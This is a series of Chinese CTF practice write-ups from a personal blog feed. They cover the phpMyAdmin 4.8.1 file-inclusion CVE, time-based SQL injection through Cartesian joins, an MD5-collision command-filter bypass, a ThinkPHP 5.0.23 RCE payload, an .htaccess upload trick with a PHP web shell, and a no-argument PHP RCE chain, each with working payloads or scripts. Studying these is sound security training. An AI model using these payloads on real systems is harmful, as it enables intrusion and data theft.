        <content type="html"><![CDATA[<p>今天是一道打着sql注入的cve问漏洞题。  </p><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>打开题目，发现页面里一串乱码。  </p><p><a href="https://img.imgdb.cn/item/6056b528524f85ce2938ef4b.png"><img src="https://img.imgdb.cn/item/6056b528524f85ce2938ef4b.png"></a>  </p><p>f12后什么也没有，那么只能从网站备份的文件这个切入点下手了。使用dirsearch来扫描一下后台文件。因为没有字典，扫描了半天，发现有一个phpmyadmin数据库页面。  </p><p><a href="https://img.imgdb.cn/item/6056b849524f85ce293a5d58.png"><img src="https://img.imgdb.cn/item/6056b849524f85ce293a5d58.png"></a>  </p><p>直接在url栏输入phpmyadmin后就可以进入这个页面。  </p><p><a href="https://img.imgdb.cn/item/6056b8a4524f85ce293a837d.png"><img src="https://img.imgdb.cn/item/6056b8a4524f85ce293a837d.png"></a>  </p><p>走到这一步其实和sql注入没啥太大关系，我们可以在这个页面上看到phpmyadmin版本为4.8.1而不是最新版，所以我们可以往这个版本的漏洞上面想，通过搜索phpmyadmin4.8.1版本的漏洞，我们可以发现确实有这样一个漏洞存在。  </p><h2 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h2><p>这个漏洞看了别人的讲解后还是比较容易理解的，它出现在几处代码。  </p><pre><code>if (! empty($_REQUEST[&#39;target&#39;])//是否存在target参数&amp;&amp; is_string($_REQUEST[&#39;target&#39;])//target的值书否为字符串&amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])//正则匹配是否以index开头&amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)//在黑名单内的过滤掉&amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])//Core类中的checkPageValidity方法) &#123;include $_REQUEST[&#39;target&#39;];exit;&#125;  </code></pre><p>这串代码解释了对上传的target变量过滤和要求。可以看到，我们上传的target变量要满足以下条件：<br>1、要是一个字符串。<br>2、不能以index开头。<br>3、不能有黑名单内的字符串。<br>4、要通过Core类中的checkPageValidity方法。  </p><p>只有满足了这四个条件，才能执行下面的include()函数，而这个函数就有可能造成文件包含漏洞。  </p><p>我们来看一下黑名单有什么。  </p><pre><code>$target_blacklist = array (//黑名单&#39;import.php&#39;, &#39;export.php&#39;);  </code></pre><p>只有’import.php’, ‘export.php’这两个字符串，也就是说我们上传的参数里不能有他俩。接下来我们再看一下checkPageValidity方法具体是什么：  </p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = [])   &#123;   if (empty($whitelist)) &#123;       $whitelist = self::$goto_whitelist;   &#125;   if (! isset($page) || !is_string($page)) &#123;       return false;   &#125;   if (in_array($page, $whitelist)) &#123;       return true;   &#125;   $_page = mb_substr(       $page,       0,       mb_strpos($page . &#39;?&#39;, &#39;?&#39;)   );   if (in_array($_page, $whitelist)) &#123;       return true;   &#125;   $_page = urldecode($page);   $_page = mb_substr(       $_page,       0,       mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)   );   if (in_array($_page, $whitelist)) &#123;       return true;   &#125;   return false;&#125;  </code></pre><p>可以看到我们需要让这个函数返回ture，当变量page在白名单中时就会返回ture，而变量page一共和白名单做过三次匹配。  </p><p>第一次是直接匹配  </p><pre><code>if (in_array($page, $whitelist)) &#123;   return true;    &#125;  </code></pre><p>第二次是将page字符串截取到第一个?的位置然后再和白名单匹配  </p><pre><code> $_page = mb_substr(   $page,   0,   mb_strpos($page . &#39;?&#39;, &#39;?&#39;)   );   if (in_array($_page, $whitelist)) &#123;   return true;   &#125;这里使用了mb_substr(),mb_strpos()函数来截取page变量从头到第一个?的内容。这两个函数的搭配使用在ctf很常见。  </code></pre><p>而这个漏洞的绕过就在第三次的匹配上  </p><pre><code>$_page = urldecode($page);$_page = mb_substr(   $_page,   0,   mb_strpos($_page . &#39;?&#39;, &#39;?&#39;));if (in_array($_page, $whitelist)) &#123;   return true;&#125;  </code></pre><p>可以看到，相较于第二次的绕过，他多了一个url的解码函数，而我们知道当参数传入浏览器时，会自动经过一次url解码，如果我们将？进行两次url编码，那么在第三次匹配前再经历一次url解码就会导致db_ sql.php作为参数而绕过白名单检测，从而实现文件读取。（关于这个绕过白名单的检测我还不是很懂，因为白名单为空，所以应该变量为空才能绕过，但是这里使用db _sql.php绕过了白名单检测。）  </p><p>所以我们可以这样构造payloa  </p><blockquote><p>index.php?target=db_sql.php%253f/../../../../../../../../flag</p></blockquote><p>这样来实现文件读取，这里%253f是?编码两次的结果。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考的还是漏洞的利用，一般当我们看到一个题目显示了某个系统的版本后就应该考虑到这道题是不是cve漏洞，关于漏洞一般是已经被发现后才会被出题考察，所以还是要上网查询一下关于漏洞的详细信息。  </p><p>附上漏洞博客：<br><a href="https://www.abelche.com/2019/11/16/CVE/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89/">phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</a></p>]]></content>
      
      
      <categories>
          
          <category> test50 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入之笛卡尔积注入</title>
      <link href="note6/undefined-undefined.html"/>
      <url>note6/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这次参加了一个vnctf，结果被爆杀了，后来才知道这个比赛是我目前达不到的境界，但是参加这次比赛还是有收获的，比如知道了这样一种新的sql注入方法——笛卡尔积注入。  </p><h1 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a>笛卡尔积注入</h1><p>其实笛卡尔积注入也是时间注入的一种方式，当我们发现sleep()函数被禁用过滤掉之后，就可以使用笛卡尔积注入来达到另一种延时注入的效果。  </p><p>下面介绍一下笛卡尔积注入的原理<br><a href="https://img.imgdb.cn/item/60562130524f85ce29016301.jpg"><img src="https://img.imgdb.cn/item/60562130524f85ce29016301.jpg"></a>  </p><p>笛卡尔积也就是两个集合相乘的运算，而数据库中表与表之间就正好可以做笛卡尔积的运算，而我们通过进行笛卡尔积运算来增加运算负荷延迟，这样做执行时间会几何倍数的提升，在表比较大的情况下会造成几何倍数的效果，导致延时时间无法控制。  </p><p>也就是说我们通过增大运算量来让sql查询的执行时间延长，从而达到延时注入的效果，比如构造如下语句。  </p><pre><code>mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C; </code></pre><p>这样就会使时间延长，通过脚本我们就可以进行sql注入，下面附上这次比赛的注入题。  </p><h1 id="VNCTF-2021-realezjvav"><a href="#VNCTF-2021-realezjvav" class="headerlink" title="[VNCTF 2021]realezjvav"></a>[VNCTF 2021]realezjvav</h1><p>可以看到这道题要求我们输入正确的用户和密码，通过fuzz测试发现sleep()函数被过滤，所以我们采用笛卡尔积注入。  </p><p><a href="https://img.imgdb.cn/item/605623c3524f85ce2902b3b8.png"><img src="https://img.imgdb.cn/item/605623c3524f85ce2902b3b8.png"></a></p><p>下面附上脚本：  </p><pre><code>import requestsimport timeurl = &quot;http://192.168.0.104:8080/user/login&quot;i = 0flag = &quot;&quot;while True :i += 1head = 32tail = 126while head &lt; tail :    mid = head + tail &gt;&gt; 1    payload = &quot;a&#39; or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#&quot; % (i,mid)    data = &#123;&quot;username&quot;:&quot;admin&quot; , &quot;password&quot; : payload&#125;       start_time = time.time()    r = requests.post(url,data = data)    print(data[&#39;password&#39;])    end_time = time.time()    if end_time - start_time &gt; 3:        head = mid + 1    else :        tail = midif head!=32:    flag += chr(head)    print(flag)else :    break  </code></pre><p>这道题的笛卡尔积注入就是下面的代码，通过测试，发现当进行三个表的笛卡尔积运算时延时大约为6秒，通过对延时的判断可以得到密码。 </p><pre><code>payload = &quot;a&#39; or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#&quot; % (i,mid)  </code></pre><p>实际跑这个脚本其实没跑出来，不知哪里出了问题。。。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题给我最大的收获也就是这个注入方式了，因为后面的都看不懂。。。。。。还是要努力。  </p>]]></content>
      
      
      <categories>
          
          <category> note6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习8</title>
      <link href="test49/undefined-undefined.html"/>
      <url>test49/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天上了一天课，晚上回寝室就开始每日的一道题，真是忙碌又充实。</p><h1 id="安洵杯-2019-easy-web-1"><a href="#安洵杯-2019-easy-web-1" class="headerlink" title="[安洵杯 2019]easy_web 1"></a>[安洵杯 2019]easy_web 1</h1><p>这道题目好像源码被改了，导致按照正常步骤做不出来，下面讲一下正常流程。  </p><p>其实这道题一开始我思考的方向错了。刚开始进入页面，发现页面的url栏里有一个cmd变量是空的，于是想着这道题目应该有可能是sql注入，所以先进行了sql注入的测试。<br><a href="https://img.imgdb.cn/item/60515264524f85ce29621d18.png"><img src="https://img.imgdb.cn/item/60515264524f85ce29621d18.png"></a>  </p><p>但是测试后发现。无论怎么注入都没有回显，所以应该不是sql注入，这时候我又查看网页源码，f12后发现我们的上传的cmd变量都会返回到网页源码中去。  </p><p><a href="https://img.imgdb.cn/item/60515314524f85ce29625f26.png"><img src="https://img.imgdb.cn/item/60515314524f85ce29625f26.png"></a>  </p><p>可以看到我输入的cmd=2’显示在了网页源码中，这就让我想起了之前寒假见到的xxs攻击，于是进行了xxs测试，输入以下代码来测试一下。  </p><pre><code>&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;</code></pre><p>发现确实在页面上回显了test字符。  </p><p><a href="https://img.imgdb.cn/item/6051540f524f85ce2962c656.png"><img src="https://img.imgdb.cn/item/6051540f524f85ce2962c656.png"></a>  </p><p>说明这道题存在xxs反射型漏洞，但是目前我做过的xxs反射型类的题目都是让我登录管理员的账户从而获得flag，也就是说让我得到管理员的cookie，而这道题目当我拿到cookie后却发现没有什么用，经过一番尝试后发现xxs攻击也行不通。  </p><p>这就是我在这道题上犯的错误，主要还是方向想错了，其实这道题并没有考到那两个方向，而是要在抓包中网页的headers信息中发现问题。  </p><p><a href="https://img.imgdb.cn/item/60515664524f85ce2963ca38.png"><img src="https://img.imgdb.cn/item/60515664524f85ce2963ca38.png"></a>  </p><p>可以看到img变量后跟了一串字符，这串字符串有些奇怪，凭着一个ctfer的直觉应该能猜到这个是base64的编码，于是拿去解码一下。  </p><p><a href="https://img.imgdb.cn/item/60515717524f85ce2964145a.png"><img src="https://img.imgdb.cn/item/60515717524f85ce2964145a.png"></a>  </p><p>发现确实是base64编码，解码后还是一串base64编码，那么再解一次，  </p><p><a href="https://img.imgdb.cn/item/60515763524f85ce296435b1.png"><img src="https://img.imgdb.cn/item/60515763524f85ce296435b1.png"></a>   </p><p>这次解码出来后是一串数字和字母，这个其实是hex加密（这就有点难想到了）。把这串字符拿过去解密一下。  </p><p><a href="https://img.imgdb.cn/item/605157e4524f85ce29646699.png"><img src="https://img.imgdb.cn/item/605157e4524f85ce29646699.png"></a>  </p><p>可以看到解密的结果是555.png，这个应该就是页面上的那张图片了。  </p><p>那么从这个过程中我们摸清了传入的img变量编码的过程，也就是先进行一次hex编码，再进行两次base64编码，得到的字符串就是最终的字符。  </p><p>那么我们也可以利用这一点，我们可以将555.png改成index.php，从而通过img变量来查看网页源码。  </p><p>我们将index.php进行hex编码，然后进行两次base64编码，得到TmprMlJUWTBOalUzT0RKRk56QTJPRGN3这样一串字符，然后通过img变量上传。  </p><p><a href="https://img.imgdb.cn/item/60515a79524f85ce29658af1.png"><img src="https://img.imgdb.cn/item/60515a79524f85ce29658af1.png"></a>  </p><p>可以看到，返回的图片经过了base64编码，将它解码后就得到了网页源码。   </p><pre><code>&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text/html;charset=utf-8&#39;);$cmd = $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;die(&quot;xixi～ no flag&quot;);&#125; else &#123;$txt = base64_encode(file_get_contents($file));echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;echo(&quot;forbid ~&quot;);echo &quot;&lt;br&gt;&quot;;&#125; else &#123;if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;    echo `$cmd`;&#125; else &#123;    echo (&quot;md5 is funny ~&quot;);&#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;  </code></pre><p>由    </p><pre><code>$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));  </code></pre><p>这串代码也可以看到刚刚我们推理出的加密方式是对的。  </p><pre><code>$txt = base64_encode(file_get_contents($file));echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;  </code></pre><p>而上面这串代码实现了读取index.php文件的功能。而重点是下面这串代码。  </p><pre><code>if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;echo(&quot;forbid ~&quot;);echo &quot;&lt;br&gt;&quot;;&#125; else &#123;if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;    echo `$cmd`;&#125; else &#123;    echo (&quot;md5 is funny ~&quot;);&#125;  </code></pre><p>可以看到cmd是用来执行命令语句的，但是过滤了很多命令，比如说cat，但是我们可以通过\来绕过黑名单，可以构造ca\t来绕过。  </p><p>但是要想成功执行命令语句，必须还要绕过一个md5比较，很明显可以看出这个是一个md5强比较，想要绕过也不难，网上就可找到关于绕过这个的字符串。那么我们构造  </p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>这两个字符串来绕过md5比较，然后传入cmd=dir%20/来查看根目录，在根目录里可以看到flag文件，构造ca\t%20/flag就可以得到flag。  </p><p>但是我在做这道题的时候不知道是不是源码被改了，无论怎么构造都无法绕过md5的比较，看了别人的wp发现过程和我一样，但是都能得到结果，实在是搞不懂出了什么问题。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实最难的地方还是对于img编码的推测，很多人估计直接就忽略了img变量后的那一串字符串的奇怪之处，比如说我，结果导致解题方向出了错。这道题也让我知道不要放过那些细微的地方。还有就是要掌握一定的密码知识。</p>]]></content>
      
      
      <categories>
          
          <category> test49 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习7</title>
      <link href="test48/undefined-undefined.html"/>
      <url>test48/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又是一道cve题目。</p><h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><p>打开题目，发现网站被黑了，但是给出了被黑的网站是由thinkphp搭建的。<br><a href="https://img.imgdb.cn/item/604f7dbf5aedab222cc73ea7.png"><img src="https://img.imgdb.cn/item/604f7dbf5aedab222cc73ea7.png"></a><br>所以这道题目就是有关think PHP漏洞利用的问题。这个thinkphp是漏洞题目的常客了。这里有一个让页面报错来查看thinkphp版本的姿势，就是上传?s=3就可以进入报错的页面，从而看到版本号。<br><a href="https://img.imgdb.cn/item/604f7f1c5aedab222cc7c391.png"><img src="https://img.imgdb.cn/item/604f7f1c5aedab222cc7c391.png"></a></p><p>可以看到版本号为5.0.23，那么就是说应该是这个版本附近的漏洞，那么就上网搜一下漏洞具体是什么。<br><a href="https://img.imgdb.cn/item/604f7fc25aedab222cc80750.png"><img src="https://img.imgdb.cn/item/604f7fc25aedab222cc80750.png"></a>  </p><p>可以看到这是一个rec漏洞，（其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。）具体可以看那些大佬的博客，我看了半天也是一知半解的，有点点菜。。。。。   </p><p>下面给出利用漏洞的payload：  </p><pre><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><p>通过post传参，最后的server[REQUEST_METHOD]=执行命令语句。  </p><p>接下来就按照这个模板尝试一下。<br><a href="https://img.imgdb.cn/item/6049d3915aedab222cf3e8fb.jpg"><img src="https://img.imgdb.cn/item/6049d3915aedab222cf3e8fb.jpg"></a>  </p><p>成功了，flag在根文件里，接着我们直接读取flag就行了。  </p><pre><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag  </code></pre><p>这样就得到了flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这道题考的就是一个漏洞，要想从源码中发现这个漏洞很难，但是还好网上已经给出了这个漏洞和利用的方法。但是其他题就不会这么容易了，下一次可能就是指个源码自己找漏洞了。  </p><p>另外这次又get到了一个新的使thinkphp报错来查看其基本信息的方法，就是构造?s=1，这个没遇到这种题一般是不知道的。  </p><p>下面附上大佬关于这个漏洞的具体分析，太强了，以后慢慢参悟吧。  </p><p><a href="https://xz.aliyun.com/t/3845">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>]]></content>
      
      
      <categories>
          
          <category> test48 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习6</title>
      <link href="test47/undefined-undefined.html"/>
      <url>test47/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天是一道上传问题，回顾巩固一下之前的知识点。  </p><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>题目很简洁，就是让我们上传一个文件，那我们就按照老方法走，上传一个最原始的一句话代码然后抓包修改。<br><a href="https://img.imgdb.cn/item/604ce18f5aedab222c808632.png"><img src="https://img.imgdb.cn/item/604ce18f5aedab222c808632.png"></a>  </p><p>可以看到意料之中的被拦截了，说是上传类型的问题，那我们就更改一下Content-Type和文件后缀名，并且给文件内容加上GIF89a来欺骗检查。  </p><p>但是这样做后仍然是文件类型不过关，那么只能在文件后缀名上再改变一下。  </p><p>经过尝试后，发现php类的后缀名的绕过都行不通，那么我们只能通过上传.hatccess文件来让系统解析我们上传的图片文件了。  </p><p>在这里第一次做的时候出了点意外，不知道由于什么原因，第一次上传测试的时候发现任何的后缀名都绕不过去，然后试着上传.htaccess文件也不行，直接就傻掉。后来看了别人的做法才发现自己是正确的。  </p><p>接下来我们就按步骤上传了。关于.htaccess文件上传绕过可以看之前的一篇博客。  </p><p>首先上传.htaccess文件。这道题目有一个坑，必须要上传png文件才能连上剑蚁，jpg文件反而不行。  </p><pre><code>.htaccess文件内容&lt;FilesMatch &quot;shell.png&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><a href="https://img.imgdb.cn/item/604ce5ff5aedab222c837fdc.png"><img src="https://img.imgdb.cn/item/604ce5ff5aedab222c837fdc.png"></a>  </p><p>发现上传成功。接着就上传我们的一句话木马。  </p><p>一句话木马内容，文件名是shell.png。   </p><pre><code>GIF89a&lt;script language=&#39;php&#39;&gt;eval($_POST[cmd]);&lt;/script&gt;  </code></pre><p>这里一句话木马的&lt;?被过滤了，所以要换一种方式来绕过。<br><a href="https://img.imgdb.cn/item/604ce7175aedab222c8407c4.png"><img src="https://img.imgdb.cn/item/604ce7175aedab222c8407c4.png"></a><br>上传成功，接下来就是用剑蚁来连接。  </p><p><a href="https://img.imgdb.cn/item/604ce7635aedab222c842797.png"><img src="https://img.imgdb.cn/item/604ce7635aedab222c842797.png"></a>  </p><p>得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实难度不大，都是以前学过的知识点，主要还是第一次上传时出现了一些意外问题导致对自己的解题思路产生了怀疑。以后在遇到这种情况最好还是从头再来一边最好。</p>]]></content>
      
      
      <categories>
          
          <category> test47 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习， </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习5——无参数REC</title>
      <link href="test46/undefined-undefined.html"/>
      <url>test46/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这道题是既包括了rec的新知识点，又介绍了一种新的源码泄露。  </p><h1 id="GXYCTF2019-禁止套娃-1"><a href="#GXYCTF2019-禁止套娃-1" class="headerlink" title="[GXYCTF2019]禁止套娃 1"></a>[GXYCTF2019]禁止套娃 1</h1><p>首先打开题目，就一句话提示，f12也啥都没有，后来才知道这道题是源码泄露，这道题是.git泄露源码。<br><a href="https://img.imgdb.cn/item/604b73c45aedab222cdffcf2.png"><img src="https://img.imgdb.cn/item/604b73c45aedab222cdffcf2.png"></a><br>对于这种泄露，可以使用githack脚本工具来进行获取源码。  </p><p>关于githack工具windows和linux里都可以下载，这里我使用的是Linux上的。（下载方式可以百度，使用方法也是百度即可。）  </p><blockquote><p>python GitHack.py <a href="http://461afe30-4539-4b8d-83c2-60dcb06e3c80.node3.buuoj.cn/.git/">http://461afe30-4539-4b8d-83c2-60dcb06e3c80.node3.buuoj.cn/.git/</a></p></blockquote><p>使用githack命令找到源码文件。  </p><p><a href="https://img.imgdb.cn/item/604b74b75aedab222ce09900.png"><img src="https://img.imgdb.cn/item/604b74b75aedab222ce09900.png"></a>  </p><p>发现确实有文件，打开得到网页源码。  </p><p><a href="https://img.imgdb.cn/item/604b74b15aedab222ce094e7.png"><img src="https://img.imgdb.cn/item/604b74b15aedab222ce094e7.png"></a>  </p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;    if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;        if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;            // echo $_GET[&#39;exp&#39;];            @eval($_GET[&#39;exp&#39;]);        &#125;        else&#123;            die(&quot;还差一点哦！&quot;);        &#125;    &#125;    else&#123;        die(&quot;再好好想想！&quot;);    &#125;&#125;else&#123;    die(&quot;还想读flag，臭弟弟！&quot;);&#125;&#125;// highlight_file(__FILE__);?&gt;  </code></pre><p>接下来才是重头戏，可以看到，我们可以通过get方式传参，但是正则匹配对变量exp做出了很多限制，在第一个匹配中，它过滤了伪协议。而第二个协议更严格。  </p><p>其实第一眼看到第二个正则匹配时还有点没看懂，看了别人的讲解后才知道为什么叫做无参数REC了。  </p><p>首先看它的匹配的字符，’/[a-z,_]匹配了字母和数字，而后面的((?R)?则是引用正则表达式本身。<br><a href="https://img.imgdb.cn/item/6049d3915aedab222cf3e8fb.jpg"><img src="https://img.imgdb.cn/item/6049d3915aedab222cf3e8fb.jpg"></a>  </p><p>也就是说当我们传入下列形式的payload时，它就会被正则匹配。并且转换为空白符。  </p><blockquote><p>xxx(xxx(xxx(…)));这很显然是函数形式。</p></blockquote><p>在看这个if语句，前面有一个’;’ ===说明在匹配后，最后payload剩下的只能有一个’;’而分号结尾的语句正是REC语句的标志，这也说明了这道题目我们只能使用函数而且不能有参数的rec语句来执行命令。这也就是无参数rec的命名由来。  </p><p>那么问题来了，函数不能有参数要怎么发挥作用呢？这里就考验一个人的积累了(不得不说能用到这么多函数搭配的人真的太强了)。  </p><p>那么来介绍一下要用到的函数。因为无参数，所以我们可以让函数返回的值当作参数。首先我们要知道目录里的所有文件，所以我们需要一个可以替代ls命令的函数。  </p><p>这里使用scandir()函数，当scandir()传入’.’，可以列出当前目录的所有文件。（这里就使用别人的演示图了）<br><a href="https://img.imgdb.cn/item/604b7af85aedab222ce44ae7.png"><img src="https://img.imgdb.cn/item/604b7af85aedab222ce44ae7.png"></a>  </p><p>但是这个’.’参数怎么得到呢，这里要用到一个比较生僻的函数  </p><blockquote><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组</p></blockquote><p>返回的具体值如下：<br><a href="https://img.imgdb.cn/item/604b7b6d5aedab222ce4915b.png"><img src="https://img.imgdb.cn/item/604b7b6d5aedab222ce4915b.png"></a>  </p><p>可以看到第一个就是我们要的参数，所以接下来我们需要一个可以单取第一个返回值的函数。  </p><blockquote><p>current() 函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p></blockquote><blockquote><p>pos() 函数返回数组中的当前元素的值。该函数是 current() 函数的别名。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p></blockquote><p>有了这个函数就可取到第一个元素的值，也就是’.’。所以最后我们构造的payload是这样的：  </p><blockquote><p>?exp=var_dump(scandir(current(localeconv())));</p></blockquote><p>var_dump()函数输出变量的相关信息，在这里它输出scandir()函数返回的目录这一数组变量信息。  </p><p>这样就可以得到目录下的所有文件。<br><a href="https://img.imgdb.cn/item/604b7d0d5aedab222ce56f78.png"><img src="https://img.imgdb.cn/item/604b7d0d5aedab222ce56f78.png"></a>  </p><p>可以看到flag.php在目录的倒数第二个。那么我们要如何读到这个文件呢？这里还需要两个函数：  </p><blockquote><p>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>array_reverse() 函数返回翻转顺序的数组。</p></blockquote><p>我们先使目录数组反转，那么flag.php文件就在正数第二个的位置，因为内部指针默认指向数组第一个元素，我们使用next()函数使指针指向下个元素并输出这样就返回的是flag.php了。  </p><p>接下来使用show_source()函数来显示整个php文件内容，从而得到flag。  </p><p>所以我们最终的payload是：  </p><blockquote><p>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</p></blockquote><p><a href="https://img.imgdb.cn/item/604b7ef75aedab222ce6870b.png"><img src="https://img.imgdb.cn/item/604b7ef75aedab222ce6870b.png"></a>  </p><p>可以说是比较复杂了。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目又让我知道了另一种源码的泄露，以后面对空白页面又多了一种解答方式。  </p><p>但是最重要的还是无参数的REC，这个可以说是对命令执行语句限制的很严的正则匹配了，但是第二个正则匹配以及(?R)?使我们可以使用全是函数的rec语句来执行命令。但是这对一个人的积累以及对于函数的熟悉以及运用的熟练程度的考察难度还是很高的。对我来说，这道题又让我多了一种做题方法。  